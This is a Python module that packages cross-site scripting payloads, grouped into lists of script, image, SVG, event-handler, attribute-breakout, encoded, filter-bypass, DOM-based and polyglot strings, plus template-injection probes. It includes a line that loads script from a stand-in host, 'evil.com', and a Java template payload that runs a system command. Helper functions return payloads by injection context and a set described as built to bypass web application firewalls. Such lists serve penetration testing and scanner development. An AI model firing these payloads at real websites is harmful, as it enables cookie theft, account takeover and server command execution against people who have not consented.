"""
XSS (Cross-Site Scripting) Payloads library.
"""

# Basic XSS payloads
BASIC = [
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<script>alert(document.cookie)</script>",
    "<script>alert(document.domain)</script>",
    "<script src=//evil.com/xss.js></script>",
]

# Image-based XSS
IMG_PAYLOADS = [
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=alert(1)>",
    "<img src='x' onerror='alert(1)'>",
    "<img/src=x onerror=alert(1)>",
    "<img src=x:x onerror=alert(1)>",
    "<img src=1 onerror=alert(1)>",
    "<img src=javascript:alert('XSS')>",
]

# SVG-based XSS
SVG_PAYLOADS = [
    "<svg onload=alert('XSS')>",
    "<svg/onload=alert(1)>",
    "<svg onload=alert(1)//",
    "<svg><script>alert(1)</script></svg>",
    "<svg><animate onbegin=alert(1)>",
]

# Event handler payloads
EVENT_HANDLERS = [
    "<body onload=alert('XSS')>",
    "<body onpageshow=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<input onblur=alert(1) autofocus><input autofocus>",
    "<marquee onstart=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<a href=javascript:alert(1)>click</a>",
    "<form action=javascript:alert(1)><input type=submit>",
    "<isindex action=javascript:alert(1) type=submit>",
    "<input type=image src=x onerror=alert(1)>",
]

# Attribute injection payloads
ATTRIBUTE_INJECTION = [
    "\" onmouseover=\"alert('XSS')\"",
    "' onfocus='alert(1)' autofocus='",
    "\" onfocus=\"alert(1)\" autofocus=\"",
    "' onclick='alert(1)'",
    "\" onclick=\"alert(1)\"",
    "><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "</script><script>alert(1)</script>",
    "\" onmouseover=alert(1) foo=\"",
    "' onmouseover=alert(1) foo='",
]

# Encoded payloads
ENCODED = [
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
]

# Filter bypass payloads
FILTER_BYPASS = [
    "<ScRiPt>alert(1)</sCrIpT>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<scr\x00ipt>alert(1)</scr\x00ipt>",
    "<<script>alert(1)//<</script>",
    "<img src=`x`onerror=alert(1)>",
    "<img src='`'onerror=alert(1)>",
    "javascript:alert(1)",
    "java\0script:alert(1)",
    "java&#x0A;script:alert(1)",
    "java&#x0D;script:alert(1)",
    "java\tscript:alert(1)",
]

# DOM-based XSS payloads
DOM_BASED = [
    "#<script>alert(1)</script>",
    "?param=<script>alert(1)</script>",
    "javascript:alert(document.domain)",
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
]

# Polyglot payloads (work in multiple contexts)
POLYGLOT = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    "'\"--></style></script><script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)><\"",
    "'-alert(1)-'",
    "'-alert(1)//",
    "\\'-alert(1)//",
]

# Template injection (for frameworks)
TEMPLATE_INJECTION = [
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    "{{constructor.constructor('alert(1)')()}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
]

# All payloads
ALL_PAYLOADS = (
    BASIC +
    IMG_PAYLOADS +
    SVG_PAYLOADS +
    EVENT_HANDLERS +
    ATTRIBUTE_INJECTION
)

def get_payloads_for_context(context: str = "html") -> list:
    """
    Get appropriate payloads for a given context.
    
    Args:
        context: Injection context (html, attribute, javascript, url)
        
    Returns:
        List of payloads
    """
    if context == "attribute":
        return ATTRIBUTE_INJECTION + EVENT_HANDLERS
    elif context == "javascript":
        return ["'-alert(1)-'", "\\'-alert(1)//", "</script><script>alert(1)</script>"]
    elif context == "url":
        return DOM_BASED + ["javascript:alert(1)"]
    elif context == "template":
        return TEMPLATE_INJECTION
    else:
        return ALL_PAYLOADS


def get_payloads_for_waf_bypass() -> list:
    """Get payloads designed to bypass WAFs."""
    return FILTER_BYPASS + ENCODED + POLYGLOT
